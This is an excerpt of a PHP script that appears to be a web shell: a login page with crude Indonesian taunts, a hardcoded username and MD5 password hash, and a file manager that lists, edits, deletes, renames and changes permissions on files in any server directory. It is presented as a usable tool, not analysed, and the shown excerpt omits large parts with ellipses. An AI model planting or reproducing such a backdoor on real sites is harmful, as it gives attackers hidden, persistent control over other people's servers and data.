...
// ================ KONFIGURASI AWAL ================
$USERNAME = 'kontol';
$PASSWORD_HASH = '860c058ff2e289129cde329e53be7673';
...
<html>
<head>
    <title>LOGINNYA DI SINI DEK!!</title>
    <style>
        :root {
            --primary: #4361ee;
            --secondary: #3f37c9;
        ...
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: "Segoe UI", Roboto, sans-serif; }
        ...
        .login-header h2 { color: var(--dark); margin-bottom: 10px; }
        ...
        .error-message { color: var(--danger); text-align: center; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>DUA TIGA KUCING SALEH | TAK BOLEH!!</h2>
            <p>HALOO SAYANG MAU MASUK GAK ???</p>
        </div>
        <?php if (isset($error)) echo "<div class='error-message'>$error</div>"; ?>
        <form method="POST">
            <div class="form-group">
                <label for="user">MASUKKAN DI SINI IDMU</label>
                <input type="text" id="user" name="user" placeholder="Enter username" required>
            </div>
            <div class="form-group">
                <label for="pass">MASUKKAN DI SINI NO IDMU</label>
...
// File Manager Tab dengan sorting folder & file
...
// Sorting: Folder di atas, File di bawah
    ...
    echo '<tr>
            ...
            <td>
                <div class="file-actions-cell">
                    <a href="?delete='.urlencode($file).'&path='.urlencode($currentDir).'" class="btn btn-danger" onclick="return confirm(\'Are you sure?\')">Delete</a>
                </div>
            </td>
        </tr>';
}
...
foreach ($files as $file) {
    ...
    echo '<tr>
            ...
            <td>'.formatSize(filesize($filePath)).'</td>
            <td>'.perms($filePath).'</td>
            <td>'.date("Y-m-d H:i:s", filemtime($filePath)).'</td>
            <td>
                <div class="file-actions-cell">
                    <a href="?edit='.urlencode($file).'&path='.urlencode($currentDir).'" class="btn btn-outline">Edit</a>
                    <a href="?delete='.urlencode($file).'&path='.urlencode($currentDir).'" class="btn btn-danger" onclick="return confirm(\'Are you sure?\')">Delete</a>
                    
                    <form class="rename-form" method="POST" action="?rename='.urlencode($file).'&path='.urlencode($currentDir).'">
                        <input type="text" name="newname" value="'.htmlspecialchars($file).'" class="rename-input" required>
                        <button type="submit" class="btn btn-primary">Rename</button>
                    </form>
                    
                    <form method="POST" action="?chmod='.urlencode($file).'&path='.urlencode($currentDir).'">
                        <input type="text" name="mode" value="'.perms($filePath).'" size="4" required>
